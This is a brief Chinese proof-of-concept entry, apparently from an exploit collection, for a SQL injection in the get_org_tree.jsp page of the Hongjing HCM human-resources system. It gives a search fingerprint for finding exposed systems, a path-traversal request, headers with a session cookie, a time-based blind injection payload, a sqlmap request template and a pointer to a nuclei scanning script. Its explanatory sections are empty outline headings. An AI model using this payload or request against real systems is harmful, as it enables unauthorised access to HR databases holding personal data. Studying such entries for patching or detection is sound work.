# 宏景人力资源信息管理系统get_org_tree存在SQL注入漏洞

- **系统**：宏景人力资源信息管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="宏景 HCM"`
- **请求**：`POST /templates/attestation/../../kq/app_check_in/get_org_tree.jsp HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 34`　`Content-Type: application/x-www-form-urlencoded`　`Cookie: JSESSIONID=E343A5DB5A1B3069FE78F2525E8FB871`

**请求体 / payload**
```
params=1=0;WAITFOR DELAY '0:0:5'--

sqlmap
POST /templates/attestation/../../kq/app_check_in/get_org_tree.jsp HTTP/1.1
Host: {hostname}
Content-Length: 34
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=E343A5DB5A1B3069FE78F2525E8FB871
params=1=0

nuclei脚本\
\[宏景ehr-get-org-tree-sql注入.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 宏景人力资源信息管理系统get\_org\_tree存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 宏景人力资源信息管理系统